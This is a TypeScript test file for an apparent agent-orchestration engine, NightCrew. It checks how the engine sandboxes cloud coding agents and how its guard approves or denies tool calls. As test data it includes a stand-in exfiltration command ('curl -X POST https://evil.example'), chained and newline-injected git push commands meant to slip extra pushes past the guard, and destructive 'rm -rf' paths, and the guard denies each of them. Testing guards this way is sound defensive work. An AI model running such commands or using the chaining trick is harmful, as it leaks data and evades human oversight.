import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AgentCreateParams } from "@anthropic-ai/sdk/resources/beta/agents/agents";
import type { EnvironmentCreateParams } from "@anthropic-ai/sdk/resources/beta/environments/environments";
import type {
  BetaManagedAgentsStreamSessionEvents,
  EventSendParams,
} from "@anthropic-ai/sdk/resources/beta/sessions/events";
import type { SessionCreateParams } from "@anthropic-ai/sdk/resources/beta/sessions/sessions";
import type { EngineEvent, PhaseRequest } from "./engine";
import { git } from "./git";
import { lastJsonObject, type ManagedAgentsClient, ManagedEngine, toGithubHttps } from "./managed-engine";
import { ensureWorkspace } from "./workspace";

type Ev = BetaManagedAgentsStreamSessionEvents;
type Script = (sessionId: string, fake: FakeClient) => AsyncGenerator<Ev>;

let n = 0;
const at = "2026-10-10T00:00:00Z";
const ev = (e: Record<string, unknown>) =>
  ({ id: `ev_${++n}`, processed_at: at, ...e }) as unknown as Ev & { id: string };
const say = (text: string) => ev({ type: "agent.message", content: [{ type: "text", text }] });
const toolUse = (name: string, input: Record<string, unknown>, evaluated_permission = "allow") =>
  ev({ type: "agent.tool_use", name, input, evaluated_permission });
const turn = () =>
  ev({ type: "span.model_request_end", is_error: false, model_request_start_id: "x", model_usage: {} });
const idle = (type: string, extra: Record<string, unknown> = {}) =>
  ev({ type: "session.status_idle", stop_reason: { type, ...extra }, stop_details: null });

/** Implements just the client methods the engine calls, and records every call. */
class FakeClient implements ManagedAgentsClient {
  calls: { method: string; args: unknown[] }[] = [];
  sessionError: unknown = null;
  private sessions = 0;
  constructor(private readonly script: Script) {}

  record(method: string, ...args: unknown[]) {
    this.calls.push({ method, args });
  }
  args<T>(method: string): T[] {
    return this.calls.filter((c) => c.method === method).map((c) => c.args[0] as T);
  }
  sent(): EventSendParams["events"] {
    return this.calls.filter((c) => c.method === "events.send").flatMap((c) => (c.args[1] as EventSendParams).events);
  }

  beta = {
    environments: {
      create: async (params: EnvironmentCreateParams) => {
        this.record("environments.create", params);
        return { id: "env_1" };
      },
    },
    agents: {
      create: async (params: AgentCreateParams) => {
        this.record("agents.create", params);
        return { id: `agent_${this.args("agents.create").length}` };
      },
    },
    sessions: {
      create: async (params: SessionCreateParams) => {
        this.record("sessions.create", params);
        if (this.sessionError) throw this.sessionError;
        return { id: `sesn_${++this.sessions}` };
      },
      retrieve: async (id: string) => {
        this.record("sessions.retrieve", id);
        return {
          id,
          status: "idle" as const,
          usage: {
            input_tokens: 1000,
            output_tokens: 200,
            cache_read_input_tokens: 500,
            cache_creation: { ephemeral_5m_input_tokens: 100 },
            list_cost: { amount: "37", currency: "USD" as const },
          },
        };
      },
      events: {
        stream: async (id: string) => {
          this.record("events.stream", id);
          return this.script(id, this);
        },
        list: (id: string) => {
          this.record("events.list", id);
          return (async function* () {})();
        },
        send: async (id: string, params: EventSendParams) => {
          this.record("events.send", id, params);
          return {};
        },
      },
    },
  };
}

const script = (...events: Ev[]): Script =>
  async function* () {
    for (const e of events) yield e;
  };

const request = (over: Partial<PhaseRequest> = {}): PhaseRequest => ({
  phase: "implement",
  cwd: work,
  prompt: "Fix the bug.",
  systemPrompt: "You are a careful engineer.",
  model: "claude-sonnet-5-5",
  guard: { worktree: work, writableDirs: [], scope: [], protectedBranches: ["main"], readOnly: false },
  maxTokens: 100_000,
  maxTurns: 50,
  signal: new AbortController().signal,
  ...over,
});

const engineFor = (fake: FakeClient) => new ManagedEngine({ client: fake, githubToken: async () => "ghs_test_token" });

// A local repo whose origin claims to be github.com/acme/widgets but, through
// url.insteadOf, really talks to a bare repo on disk. No network.
let root: string;
let bare: string;
let work: string;
const BRANCH = "nc/fix-bug";
const ID = ["-c", "user.name=t", "-c", "user.email=t@t"];

beforeEach(async () => {
  root = mkdtempSync(join(tmpdir(), "nc-managed-"));
  bare = join(root, "remote.git");
  work = join(root, "work");
  await git(root, "init", "-q", "--bare", "-b", "main", bare);
  await git(root, "init", "-q", "-b", "main", work);
  writeFileSync(join(work, "README.md"), "# widgets\n");
  await git(work, "add", "-A");
  await git(work, ...ID, "commit", "-qm", "init");
  await git(work, "remote", "add", "origin", "git@github.com:acme/widgets.git");
  await git(work, "config", `url.${bare}.insteadOf`, "git@github.com:acme/widgets.git");
  await git(work, "push", "-q", "origin", "main");
  await git(work, "checkout", "-q", "-b", BRANCH);
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

/** What the cloud agent does: clone, commit on the task branch, push. */
async function cloudCommit(file: string, content: string) {
  const clone = join(root, `cloud-${++n}`);
  await git(root, "clone", "-q", "-b", BRANCH, bare, clone);
  writeFileSync(join(clone, file), content);
  await git(clone, "add", "-A");
  await git(clone, ...ID, "commit", "-qm", `cloud: ${file}`);
  const pushed = await git(clone, "push", "-q", "origin", `HEAD:${BRANCH}`);
  if (!pushed.ok) throw new Error(pushed.stderr);
}

describe("ManagedEngine", () => {
  test("creates one environment, with limited networking, and caches agents", async () => {
    const fake = new FakeClient(script(say('{"tasks":[]}'), idle("end_turn")));
    const engine = engineFor(fake);
    const compose = request({
      phase: "compose",
      cwd: root,
      outputSchema: { type: "object" },
      guard: { ...request().guard, readOnly: true },
    });
    const a = await engine.runPhase(compose, () => {});
    const b = await engine.runPhase(compose, () => {});
    expect(a.ok).toBe(true);
    expect(b.ok).toBe(true);

    const envs = fake.args<EnvironmentCreateParams>("environments.create");
    expect(envs).toHaveLength(1);
    expect(envs[0]?.config).toEqual({
      type: "cloud",
      networking: {
        type: "limited",
        allowed_hosts: ["github.com", "api.github.com"],
        allow_package_managers: true,
        allow_mcp_servers: false,
      },
    });
    expect(fake.args("agents.create")).toHaveLength(1);
    // Compose has no repo to mount and needs no tools.
    expect(fake.args<SessionCreateParams>("sessions.create")[0]?.resources).toBeUndefined();
    expect(fake.args<AgentCreateParams>("agents.create")[0]?.tools).toEqual([
      { type: "agent_toolset_20260401", default_config: { enabled: false } },
    ]);
    expect(a.sessionId).toBe("sesn_1");
    expect(b.sessionId).toBe("sesn_2");
  });

  test("mounts the repo from an SSH remote, on the current branch, with a budget", async () => {
    const fake = new FakeClient(script(say("Plan: do it."), idle("end_turn")));
    const r = await engineFor(fake).runPhase(
      request({ phase: "plan", guard: { ...request().guard, readOnly: true } }),
      () => {},
    );
    expect(r.ok).toBe(true);
    expect(r.text).toBe("Plan: do it.");
    const session = fake.args<SessionCreateParams>("sessions.create")[0];
    expect(session?.resources).toEqual([
      {
        type: "github_repository",
        url: "https://github.com/acme/widgets",
        mount_path: "/workspace/widgets",
        checkout: { type: "branch", name: BRANCH },
        authorization_token: "ghs_test_token",
      },
    ]);
    expect(session?.budget).toEqual({ type: "limit", max_list_cost: { amount: "150", currency: "USD" } });
    expect(session?.agent).toBe("agent_1");
    expect(session?.environment_id).toBe("env_1");
    // The branch was pushed so the sandbox can check it out.
    expect((await git(bare, "rev-parse", "--verify", "--quiet", `refs/heads/${BRANCH}`)).ok).toBe(true);

    // Usage and cost come from the session.
    expect(r.costUsd).toBe(0.37);
    expect(r.tokensIn).toBe(1600);
    expect(r.tokensOut).toBe(200);

    // The prompt carries the system prompt, the task and the sandbox rules.
    const message = fake.sent().find((e) => e.type === "user.message");
    const text = message?.type === "user.message" && message.content[0]?.type === "text" ? message.content[0].text : "";
    expect(text).toContain("You are a careful engineer.");
    expect(text).toContain("Fix the bug.");
    expect(text).toContain("/workspace/widgets");
    expect(text).toContain("read-only");
    expect(text).not.toContain("ghs_test_token");
  });

  test("converts GitHub remotes to HTTPS repo URLs", () => {
    expect(toGithubHttps("git@github.com:acme/widgets.git")).toBe("https://github.com/acme/widgets");
    expect(toGithubHttps("ssh://git@github.com/acme/widgets")).toBe("https://github.com/acme/widgets");
    expect(toGithubHttps("https://x-access-token:abc@github.com/acme/widgets.git")).toBe(
      "https://github.com/acme/widgets",
    );
    expect(toGithubHttps("https://gitlab.com/acme/widgets.git")).toBeNull();
    expect(toGithubHttps("/tmp/remote.git")).toBeNull();
  });

  test("read-only phases disable the write and edit tools", async () => {
    const fake = new FakeClient(script(idle("end_turn")));
    const engine = engineFor(fake);
    await engine.runPhase(request({ phase: "review", guard: { ...request().guard, readOnly: true } }), () => {});
    await engine.runPhase(request({ phase: "implement" }), () => {});
    const [readOnly, write] = fake.args<AgentCreateParams>("agents.create");
    expect(readOnly?.tools?.[0]).toEqual({
      type: "agent_toolset_20260401",
      default_config: { enabled: true, permission_policy: { type: "auto" } },
      configs: [
        { name: "write", enabled: false },
        { name: "edit", enabled: false },
        { name: "bash", permission_policy: { type: "always_ask" } },
      ],
    });
    // Every tool that writes or runs a command asks, so the guard decides it.
    expect(write?.tools?.[0]).toEqual({
      type: "agent_toolset_20260401",
      default_config: { enabled: true, permission_policy: { type: "auto" } },
      configs: [
        { name: "bash", permission_policy: { type: "always_ask" } },
        { name: "write", permission_policy: { type: "always_ask" } },
        { name: "edit", permission_policy: { type: "always_ask" } },
      ],
    });
  });

  test("the guard denies a blocked shell command the cloud holds for confirmation", async () => {
    let calls = 0;
    const fake = new FakeClient(async function* () {
      if (calls++) return;
      const push = toolUse("bash", { command: "git push origin main" }, "ask");
      const test = toolUse("bash", { command: "bun test" }, "ask");
      yield push;
      yield test;
      yield idle("requires_action", { event_ids: [push.id, test.id] });
      yield idle("end_turn");
    });
    const events: EngineEvent[] = [];
    await engineFor(fake).runPhase(request(), (e) => events.push(e));
    const confirmations = fake.sent().filter((e) => e.type === "user.tool_confirmation");
    expect(confirmations).toEqual([
      {
        type: "user.tool_confirmation",
        tool_use_id: expect.any(String),
        result: "deny",
        deny_message: "NightCrew pushes the branch itself after checks pass.",
      },
      { type: "user.tool_confirmation", tool_use_id: expect.any(String), result: "allow" },
    ]);
    expect(events.find((e) => e.kind === "denied")?.text).toBe(
      "Blocked $ git push origin main: NightCrew pushes the branch itself after checks pass.",
    );
  });

  test("an already stopped phase does nothing", async () => {
    const stop = new AbortController();
    stop.abort();
    const fake = new FakeClient(script(idle("end_turn")));
    const r = await engineFor(fake).runPhase(request({ signal: stop.signal }), () => {});
    expect(r.ok).toBe(false);
    expect(r.error).toBe("Stopped: the task ran out of time or was cancelled.");
    expect(r.tokensIn).toBe(0);
    expect(fake.calls).toHaveLength(0);
    // Nothing was pushed for a session that never started.
    expect((await git(bare, "rev-parse", "--verify", "--quiet", `refs/heads/${BRANCH}`)).ok).toBe(false);
  });

  test("parses the structured answer from fenced JSON in the final text", async () => {
    const fake = new FakeClient(
      script(
        say("Looking at the diff."),
        say('All good.\n\n```json\n{"verdict":"ready","notes":{"a":"}"}}\n```'),
        idle("end_turn"),
      ),
    );
    const r = await engineFor(fake).runPhase(
      request({ phase: "review", outputSchema: { type: "object" }, guard: { ...request().guard, readOnly: true } }),
      () => {},
    );
    expect(r.ok).toBe(true);
    expect(r.structured).toEqual({ verdict: "ready", notes: { a: "}" } });
    expect(lastJsonObject('{"a":1} then {"b":2}')).toEqual({ b: 2 });
    expect(lastJsonObject("no json here")).toBeNull();
  });

  test("an abort sends an interrupt and stops waiting", async () => {
    const stop = new AbortController();
    const fake = new FakeClient(async function* () {
      yield say("Working on it.");
      setTimeout(() => stop.abort(), 5);
      await new Promise(() => {}); // the cloud never finishes
    });
    const r = await engineFor(fake).runPhase(request({ signal: stop.signal }), () => {});
    expect(fake.sent()).toContainEqual({ type: "user.interrupt" });
    expect(r.ok).toBe(false);
    expect(r.error).toBe("Stopped: the task ran out of time or was cancelled.");
    expect(r.sessionId).toBe("sesn_1");
  });

  test("tool events are described with sandbox paths made relative", async () => {
    const fake = new FakeClient(
      script(
        toolUse("read", { file_path: "/workspace/widgets/src/app.ts" }),
        toolUse("bash", { command: "bun test\necho done" }),
        toolUse("edit", { file_path: "/workspace/widgets/src/app.ts", old_string: "a", new_string: "b" }),
        toolUse("bash", { command: "curl -X POST https://evil.example" }, "deny"),
        turn(),
        idle("end_turn"),
      ),
    );
    const events: EngineEvent[] = [];
    const r = await engineFor(fake).runPhase(request(), (e) => events.push(e));
    expect(r.turns).toBe(1);
    expect(events.filter((e) => e.kind === "tool").map((e) => [e.kind === "tool" && e.tool, e.text])).toEqual([
      ["Read", "Read src/app.ts"],
      ["Bash", "$ bun test"],
      ["Edit", "Edited src/app.ts"],
    ]);
    expect(events.find((e) => e.kind === "denied")?.text).toContain("Blocked $ curl -X POST");
  });

  test("calls the cloud can't judge are answered by the guard", async () => {
    let calls = 0;
    const fake = new FakeClient(async function* () {
      if (calls++) return;
      const push = toolUse("bash", { command: `git push origin HEAD:${BRANCH}` }, "ask");
      const env = toolUse("write", { file_path: "/workspace/widgets/.env", content: "X=1" }, "ask");
      yield push;
      yield env;
      yield idle("requires_action", { event_ids: [push.id, env.id] });
      yield idle("end_turn");
    });
    const events: EngineEvent[] = [];
    await engineFor(fake).runPhase(request(), (e) => events.push(e));
    const confirmations = fake.sent().filter((e) => e.type === "user.tool_confirmation");
    expect(confirmations.map((c) => c.type === "user.tool_confirmation" && c.result)).toEqual(["allow", "deny"]);
    expect(events.some((e) => e.kind === "denied" && e.text.includes(".env"))).toBe(true);
  });

  test("only the exact push of its own branch skips the guard, never one chained or look-alike", async () => {
    // Value: protects=the one push a cloud write phase may make can't carry a second command or reach another branch past the guard; fails_when=allowedPush loses its ^...$ anchors or exact-branch match, or ignores readOnly; why_new=tests cover the exact own-branch push and a push to main only; seam=none; no_claim=what the real cloud sandbox runs (fake Managed Agents client; guard decisions only)
    const confirmed = async (cmds: string[], over: Partial<PhaseRequest> = {}) => {
      let calls = 0;
      const fake = new FakeClient(async function* () {
        if (calls++) return;
        const uses = cmds.map((command) => toolUse("bash", { command }, "ask"));
        for (const u of uses) yield u;
        yield idle("requires_action", { event_ids: uses.map((u) => u.id) });
        yield idle("end_turn");
      });
      await engineFor(fake).runPhase(request(over), () => {});
      const sent = fake.sent().flatMap((c) => (c.type === "user.tool_confirmation" ? [c.result] : []));
      return sent;
    };
    expect(
      await confirmed([
        `git push origin HEAD:refs/heads/${BRANCH}`,
        `git push origin HEAD:${BRANCH} && git push origin HEAD:main`,
        `git push origin HEAD:${BRANCH}; git push origin HEAD:release`,
        `git push origin HEAD:${BRANCH}-other`,
        `git push origin HEAD:${BRANCH}\ngit push origin HEAD:main`,
        `git push --force origin HEAD:${BRANCH}`,
      ]),
    ).toEqual(["allow", "deny", "deny", "deny", "deny", "deny"]);
    // A read-only phase may not push even its own branch.
    expect(
      await confirmed([`git push origin HEAD:${BRANCH}`], {
        phase: "review",
        guard: { ...request().guard, readOnly: true },
      }),
    ).toEqual(["deny"]);
  });

  // Value: protects=managed agents cleaning build output by its sandbox path; fails_when=Bash commands are judged with the /workspace mount path instead of the local worktree; why_new=only file_path/path were rewritten before; seam=none
  test("shell commands are judged with the mount path mapped to the worktree", async () => {
    let calls = 0;
    // Only a whole mount path is mapped, not one inside a longer path or name.
    const cmds = [
      "rm -rf /workspace/widgets/dist",
      "rm -rf /srv/workspace/widgets/dist",
      "rm -rf /workspace/widgets-old",
    ];
    const fake = new FakeClient(async function* () {
      if (calls++) return;
      const uses = cmds.map((command) => toolUse("bash", { command }, "ask"));
      for (const u of uses) yield u;
      yield idle("requires_action", { event_ids: uses.map((u) => u.id) });
      yield idle("end_turn");
    });
    const events: EngineEvent[] = [];
    await engineFor(fake).runPhase(request(), (e) => events.push(e));
    const confirmations = fake.sent().filter((e) => e.type === "user.tool_confirmation");
    expect(confirmations.map((c) => c.type === "user.tool_confirmation" && c.result)).toEqual([
      "allow",
      "deny",
      "deny",
    ]);
    // What the agent runs and what the live view shows keep the sandbox path.
    const allowed = events.find((e) => e.kind === "tool");
    expect(allowed?.kind === "tool" && allowed.input).toEqual({ command: "rm -rf /workspace/widgets/dist" });
  });

  test("a 429 surfaces as rateLimited", async () => {
    const fake = new FakeClient(script());
    fake.sessionError = Object.assign(new Error("429 rate_limit_error"), { status: 429 });
    const r = await engineFor(fake).runPhase(request(), () => {});
    expect(r.ok).toBe(false);
    expect(r.rateLimited).toBe(true);
    expect(r.error).toBe("Rate limited by the API (429).");

    const inSession = new FakeClient(
      script(
        ev({
          type: "session.error",
          error: { type: "model_rate_limited_error", message: "slow down", retry_status: { type: "exhausted" } },
        }),
        idle("retries_exhausted"),
      ),
    );
    const s = await engineFor(inSession).runPhase(request(), () => {});
    expect(s.rateLimited).toBe(true);
    expect(s.error).toBe("Rate limited by the API (429).");
  });

  test("a session that reaches its budget reports it like the local engine", async () => {
    const fake = new FakeClient(script(say("Halfway."), idle("budget_reached")));
    const r = await engineFor(fake).runPhase(request(), () => {});
    expect(r.ok).toBe(false);
    expect(r.error).toBe("Hit the task's token budget before finishing.");
    expect(r.text).toBe("Halfway.");
  });

  test("write phases fast-forward the worktree to the cloud's commits", async () => {
    const fake = new FakeClient(async function* () {
      yield say("Fixing.");
      await cloudCommit("fix.txt", "fixed\n");
      yield say("Pushed the fix.");
      yield idle("end_turn");
    });
    const r = await engineFor(fake).runPhase(request(), () => {});
    expect(r.error).toBeNull();
    expect(r.ok).toBe(true);
    expect(readFileSync(join(work, "fix.txt"), "utf8")).toBe("fixed\n");
    const local = (await git(work, "rev-parse", "HEAD")).stdout.trim();
    const remote = (await git(bare, "rev-parse", BRANCH)).stdout.trim();
    expect(local).toBe(remote);
  });

  test("read-only phases leave the worktree alone", async () => {
    const fake = new FakeClient(async function* () {
      await cloudCommit("stray.txt", "x\n");
      yield idle("end_turn");
    });
    const r = await engineFor(fake).runPhase(
      request({ phase: "plan", guard: { ...request().guard, readOnly: true } }),
      () => {},
    );
    expect(r.ok).toBe(true);
    expect(existsSync(join(work, "stray.txt"))).toBe(false);
  });

  test("diverged history fails with a clear error", async () => {
    const fake = new FakeClient(async function* () {
      await cloudCommit("fix.txt", "cloud\n");
      writeFileSync(join(work, "local.txt"), "local\n");
      await git(work, "add", "-A");
      await git(work, ...ID, "commit", "-qm", "local");
      yield idle("end_turn");
    });
    const r = await engineFor(fake).runPhase(request(), () => {});
    expect(r.ok).toBe(false);
    expect(r.error).toBe("The cloud session's changes couldn't be pulled cleanly.");
  });

  test("refuses to run on a protected branch", async () => {
    await git(work, "checkout", "-q", "main");
    const fake = new FakeClient(script(idle("end_turn")));
    const r = await engineFor(fake).runPhase(request(), () => {});
    expect(r.ok).toBe(false);
    expect(r.error).toContain("protected");
    expect(fake.calls).toHaveLength(0);
  });
  test("a task's clone: the start is pushed from your repo by sha, and the cloud's work comes back through it", async () => {
    // Value: protects=managed mode runs no host git in the task's clone: the starting point is pushed from your repo by sha, the cloud's commits are fetched into refs/nightcrew/wip/<id> in your repo (the result ref waits for the pipeline's gate), and the clone is updated from there; fails_when=the engine reads the clone's (missing) origin, pushes by branch name, or fetches straight into the clone with host git; why_new=D12 managed mode; seam=none
    const base = (await git(work, "rev-parse", "main")).stdout.trim();
    const ws = await ensureWorkspace({
      dataDir: join(root, "data"),
      repo: { id: "repo_1", path: work },
      task: { id: "task_1", branch: BRANCH },
      base,
    });
    expect((await git(ws.dir, "remote")).stdout.trim()).toBe("");
    const fake = new FakeClient(async function* () {
      // The cloud starts from exactly the commit your repo has for the task.
      expect((await git(bare, "rev-parse", BRANCH)).stdout.trim()).toBe(base);
      await cloudCommit("fix.txt", "fixed\n");
      yield idle("end_turn");
    });
    const r = await engineFor(fake).runPhase(
      request({ cwd: ws.dir, guard: { ...request().guard, worktree: ws.dir } }),
      () => {},
    );
    expect(r.error).toBeNull();
    expect(r.ok).toBe(true);
    const cloud = (await git(bare, "rev-parse", BRANCH)).stdout.trim();
    expect((await git(work, "rev-parse", "refs/nightcrew/wip/task_1")).stdout.trim()).toBe(cloud);
    expect((await git(work, "rev-parse", "--verify", "--quiet", "refs/nightcrew/tasks/task_1")).ok).toBe(false);
    expect((await git(ws.dir, "rev-parse", "HEAD")).stdout.trim()).toBe(cloud);
    expect(readFileSync(join(ws.dir, "fix.txt"), "utf8")).toBe("fixed\n");
    expect((await git(ws.dir, "remote")).stdout.trim()).toBe("");
  });

  test("a task's clone refuses cloud work that rewrote where it started", async () => {
    // Value: protects=cloud commits that don't build on the pushed start are refused, and the last good copy in your repo is put back; fails_when=the force-fetched cloud history replaces the task's work unchecked; why_new=D12 managed mode; seam=none
    const base = (await git(work, "rev-parse", "main")).stdout.trim();
    const ws = await ensureWorkspace({
      dataDir: join(root, "data"),
      repo: { id: "repo_1", path: work },
      task: { id: "task_2", branch: BRANCH },
      base,
    });
    const fake = new FakeClient(async function* () {
      const other = join(root, "rewrite");
      await git(root, "clone", "-q", "-b", BRANCH, bare, other);
      await git(other, "checkout", "-q", "--orphan", "x");
      writeFileSync(join(other, "new.txt"), "new\n");
      await git(other, "add", "-A");
      await git(other, ...ID, "commit", "-qm", "rewrite");
      await git(other, "push", "-q", "-f", "origin", `HEAD:${BRANCH}`);
      yield idle("end_turn");
    });
    const r = await engineFor(fake).runPhase(
      request({ cwd: ws.dir, guard: { ...request().guard, worktree: ws.dir } }),
      () => {},
    );
    expect(r.ok).toBe(false);
    expect(r.error).toBe("The cloud session's changes couldn't be pulled cleanly.");
    expect((await git(work, "rev-parse", "refs/nightcrew/wip/task_2")).stdout.trim()).toBe(base);
    expect(existsSync(join(ws.dir, "new.txt"))).toBe(false);
  });
});
